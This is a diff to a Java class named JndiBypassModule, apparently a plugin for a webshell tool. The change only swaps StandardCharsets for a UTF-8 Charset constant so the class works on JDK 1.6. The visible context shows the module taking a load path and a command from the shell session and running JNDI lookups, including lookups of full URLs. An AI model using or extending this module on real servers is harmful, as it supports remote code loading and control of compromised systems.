@@ -2,7 +2,7 @@ package shells.plugins.java.assets;
 
 import java.io.PrintWriter;
 import java.io.StringWriter;
-import java.nio.charset.StandardCharsets;
+import java.nio.charset.Charset;   // JDK 1.6: StandardCharsets is Java 7+
 import java.util.Hashtable;
 import java.util.Map;
 import javax.naming.Context;
@@ -16,6 +16,8 @@ import javax.naming.NamingException;
  */
 public class JndiBypassModule {
 
+    private static final Charset UTF8 = Charset.forName("UTF-8");
+
     private Map session;
 
     public void setSession(Map session) {
@@ -28,7 +30,7 @@ public class JndiBypassModule {
     private String getString(String key) {
         Object value = this.session != null ? this.session.get(key) : null;
         if (value instanceof byte[]) {
-            return new String((byte[]) value, StandardCharsets.UTF_8);
+            return new String((byte[]) value, UTF8);
         }
         return value != null ? value.toString() : null;
     }
@@ -76,11 +78,11 @@ public class JndiBypassModule {
             if (loadPath == null || loadPath.trim().isEmpty()) {
                 if (cmd == null || cmd.trim().isEmpty()) {
                     result.append("[-] \u52a0\u8f7d\u8def\u5f84\u4e0e\u547d\u4ee4\u81f3\u5c11\u586b\u4e00\u9879\u3002\n");
-                    return result.toString().getBytes(StandardCharsets.UTF_8);
+                    return result.toString().getBytes(UTF8);
                 }
                 result.append("[*] \u4ec5\u547d\u4ee4\uff0c\u4f7f\u7528\u9ed8\u8ba4 InitialContext\n");
                 lookupAndAppend(result, new InitialContext(), cmd.trim());
-                return result.toString().getBytes(StandardCharsets.UTF_8);
+                return result.toString().getBytes(UTF8);
             }
 
             loadPath = loadPath.trim();
@@ -89,7 +91,7 @@ public class JndiBypassModule {
             if (cmdTrim.isEmpty()) {
                 result.append("[*] \u5355\u6b21 lookup\uff08\u5168\u540d/\u5b8c\u6574 URL\uff09\n");
                 lookupAndAppend(result, new InitialContext(), loadPath);
-                return result.toString().getBytes(StandardCharsets.UTF_8);
+                return result.toString().getBytes(UTF8);
             }
 
             if (loadPath.contains("://")) {
@@ -117,7 +119,7 @@ public class JndiBypassModule {
             appendThrowable(result, t);
         }
 
-        return result.toString().getBytes(StandardCharsets.UTF_8);
+        return result.toString().getBytes(UTF8);
     }
 
     private static void lookupAndAppend(StringBuilder result, Context ctx, String name) throws NamingException {
